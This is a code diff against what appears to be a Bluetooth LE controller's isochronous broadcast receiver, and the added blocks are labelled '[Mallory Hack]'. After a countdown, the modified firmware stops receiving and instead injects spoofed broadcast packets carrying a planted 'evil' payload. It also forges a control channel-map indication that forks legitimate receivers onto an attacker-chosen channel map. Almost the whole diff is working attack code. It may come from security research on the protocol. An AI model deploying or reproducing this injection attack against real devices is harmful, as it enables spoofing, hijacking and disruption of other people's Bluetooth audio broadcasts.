@@ -39,6 +39,23 @@
 
 #include "hal/debug.h"
 
+// [Mallory Hack] GLOBALS START
+static int32_t packets_unil_attack_start = 6;
+
+static uint8_t sniffed_bis_storage[100];
+#define sniffed_bis_pdu (*(struct pdu_bis *)sniffed_bis_storage)
+
+static uint8_t sniffed_bis_pdu_flag = 0;
+static uint16_t forking_start = 1000;
+static uint16_t forking_instant = 1000;
+static uint8_t forking_chan_map[] = { 0x1F, 0X00, 0x00, 0x00, 0x1F };
+static uint8_t phase = 1;
+extern uint32_t cntr_cnt_get(void);
+
+static uint8_t global_ctrl_chan_use = 0;
+static uint32_t evil_counter_val = 666;
+// [Mallory Hack] GLOBALS END
+
 static int init_reset(void);
 static int create_prepare_cb(struct lll_prepare_param *p);
 static int prepare_cb(struct lll_prepare_param *p);
@@ -67,10 +84,90 @@ static void isr_rx_iso_data_invalid(const struct lll_sync_iso *const lll,
 static void isr_rx_ctrl_recv(struct lll_sync_iso *lll, struct pdu_bis *pdu);
 
 /* FIXME: Optimize by moving to a common place, as similar variable is used for
- *        connections too.
+ * connections too.
  */
 static uint8_t trx_cnt;
 static uint8_t crc_ok_anchor;
+
+// [Mallory Hack] ATTACK LOGIC START
+static void isr_spoofed_iso_ctrl_subevent_done(void *param)
+{
+	DEBUG_RADIO_ACTIVE(1);
+	k_busy_wait(10);
+	DEBUG_RADIO_ACTIVE(0);
+
+	radio_tmr_end_capture();
+	radio_status_reset();
+}
+
+static void isr_spoofed_iso_done(void *param)
+{
+	DEBUG_RADIO_ACTIVE(1);
+	k_busy_wait(10);
+	DEBUG_RADIO_ACTIVE(0);
+
+	radio_tmr_end_capture();
+	radio_status_reset();
+
+	struct lll_sync_iso *lll;
+	lll = param;
+
+	uint16_t event_counter;
+	event_counter = (lll->payload_count / lll->bn) + lll->latency_event;
+
+	if ((event_counter - 1) > forking_start && (event_counter - 1) <= forking_instant) {
+		uint8_t access_addr[4];
+		util_bis_aa_le32(0U, lll->seed_access_addr, access_addr);
+
+		uint8_t crc_init[3];
+		crc_init[0] = 0U;
+		(void)memcpy(&crc_init[1], lll->base_crc_init, sizeof(uint16_t));
+
+		radio_phy_set(lll->phy, PHY_FLAGS_S8);
+		radio_aa_set(access_addr);
+		radio_crc_configure(PDU_CRC_POLYNOMIAL, sys_get_le24(crc_init));
+		lll_chan_set(global_ctrl_chan_use);
+
+		struct pdu_bis *pdu = NULL;
+		struct pdu_big_ctrl_chan_map_ind *chm;
+
+		pdu = radio_pkt_big_ctrl_get();
+		pdu->ll_id = PDU_BIS_LLID_CTRL;
+		pdu->cssn = 1U;
+		pdu->cstf = 0U;
+		pdu->rfu = 0U;
+
+		pdu->len = offsetof(struct pdu_big_ctrl, ctrl_data) +
+			   sizeof(struct pdu_big_ctrl_chan_map_ind);
+		pdu->ctrl.opcode = PDU_BIG_CTRL_TYPE_CHAN_MAP_IND;
+
+		chm = (void *)&pdu->ctrl.chan_map_ind;
+		(void)memcpy(chm->chm, &forking_chan_map, sizeof(chm->chm));
+		chm->instant = forking_instant;
+
+		radio_pkt_tx_set(pdu);
+
+		uint8_t pkt_flags;
+		pkt_flags = RADIO_PKT_CONF_FLAGS(RADIO_PKT_CONF_PDU_TYPE_BIS,
+						 lll->phy,
+						 RADIO_PKT_CONF_CTE_DISABLED);
+		radio_pkt_configure(RADIO_PKT_CONF_LENGTH_8BIT,
+					sizeof(struct pdu_big_ctrl),
+					pkt_flags);
+
+		radio_isr_set(isr_spoofed_iso_ctrl_subevent_done, NULL);
+		radio_switch_complete_and_disable();
+		radio_tmr_start(1U, cntr_cnt_get() + 3, 0U);
+	}
+
+	if (event_counter == forking_instant) {
+		lll->data_chan_count =
+				util_ones_count_get(&forking_chan_map[0], sizeof(forking_chan_map));
+		(void)memcpy(lll->data_chan_map, &forking_chan_map,
+					sizeof(lll->data_chan_map));
+	}
+}
+// [Mallory Hack] ATTACK LOGIC END
 
 int lll_sync_iso_init(void)
 {
@@ -156,7 +253,11 @@ static int prepare_cb(struct lll_prepare_param *p)
 		return 0;
 	}
 
-	radio_isr_set(isr_rx, p->param);
+	// [Mallory Hack] Countdown to attack
+	if (packets_unil_attack_start > 0) {
+		radio_isr_set(isr_rx, p->param);
+	}
+	packets_unil_attack_start--;
 
 	DEBUG_RADIO_START_O(1);
 	return 0;
@@ -241,6 +342,9 @@ static int prepare_cb_common(struct lll_prepare_param *p)
 					   &lll->data_chan.prn_s,
 					   &lll->data_chan.remap_idx);
 
+	// [Mallory Hack] Save the control channel before we potentially switch later
+	global_ctrl_chan_use = data_chan_use;
+
 	/* Initialize stream current */
 	lll->stream_curr = 0U;
 
@@ -308,6 +412,75 @@ static int prepare_cb_common(struct lll_prepare_param *p)
 	radio_aa_set(access_addr);
 	radio_crc_configure(PDU_CRC_POLYNOMIAL, sys_get_le24(crc_init));
 	lll_chan_set(data_chan_use);
+
+	// [Mallory Hack] Injection logic start
+	if (packets_unil_attack_start <= 0) {
+		uint8_t pkt_flags = RADIO_PKT_CONF_FLAGS(RADIO_PKT_CONF_PDU_TYPE_BIS,
+						 lll->phy,
+						 RADIO_PKT_CONF_CTE_DISABLED);
+		radio_pkt_configure(RADIO_PKT_CONF_LENGTH_8BIT, lll->max_pdu, pkt_flags);
+
+		// Determine phase for forking attack
+		if (event_counter >= forking_start && event_counter < forking_instant) {
+			sniffed_bis_pdu.ll_id = PDU_BIS_LLID_COMPLETE_END;
+			sniffed_bis_pdu.cssn = 1U;
+			sniffed_bis_pdu.cstf = 1U;
+			phase = 2;
+		} else if (event_counter >= forking_instant) {
+			sniffed_bis_pdu.ll_id = PDU_BIS_LLID_COMPLETE_END;
+			sniffed_bis_pdu.cssn = 1U;
+			sniffed_bis_pdu.cstf = 0U;
+			phase = 3;
+		} else {
+			sniffed_bis_pdu.ll_id = PDU_BIS_LLID_COMPLETE_END;
+			sniffed_bis_pdu.cssn = 0U;
+			sniffed_bis_pdu.cstf = 0U;
+			phase = 1;
+		}
+
+		/* PREPARE EVIL PAYLOAD (666) */
+		sniffed_bis_pdu.len = sizeof(uint32_t); // 4 Bytes
+		// Zero out payload first
+        memset(sniffed_bis_pdu.payload, 0, 10);
+		//memset(sniffed_bis_pdu.payload, 0, sizeof(sniffed_bis_pdu.payload));
+		// Insert 666 (Little Endian)
+		sys_put_le32(evil_counter_val, sniffed_bis_pdu.payload);
+
+		radio_pkt_tx_set(&sniffed_bis_pdu);
+		radio_isr_set(isr_spoofed_iso_done, lll);
+
+		/* If inside the forking window, allow for back-to-back TX to send Ctrl PDU */
+		if ((event_counter - 1) > forking_start && (event_counter - 1) <= forking_instant) {
+			uint16_t iss_us;
+			// Calculate Inter-Subevent Space
+			iss_us = lll->sub_interval -
+				PDU_BIS_US(40, 0U, lll->phy, PHY_FLAGS_S8);
+			radio_tmr_tifs_set(iss_us);
+			radio_switch_complete_and_b2b_tx(lll->phy, PHY_FLAGS_S8, lll->phy, PHY_FLAGS_S8);
+		} else {
+			radio_switch_complete_and_disable();
+		}
+
+		global_ctrl_chan_use = data_chan_use;
+
+		ticks_at_event = p->ticks_at_expire;
+		ull = HDR_LLL2ULL(lll);
+		ticks_at_event += lll_event_offset_get(ull);
+
+		ticks_at_start = ticks_at_event;
+		ticks_at_start += HAL_TICKER_US_TO_TICKS(EVENT_OVERHEAD_START_US);
+
+		remainder = p->remainder - HAL_TICKER_US_TO_TICKS(EVENT_TICKER_RES_MARGIN_US);
+		radio_tmr_start(1U, ticks_at_start, remainder);
+
+		if (packets_unil_attack_start == 0) {
+			forking_start = event_counter + CONN_ESTAB_COUNTDOWN;
+			forking_instant = forking_start + CONN_ESTAB_COUNTDOWN;
+		}
+
+		return 0;
+	}
+	// [Mallory Hack] Injection logic end
 
 	/* By design, there shall always be one free node rx available for
 	 * setting up radio for new PDU reception.
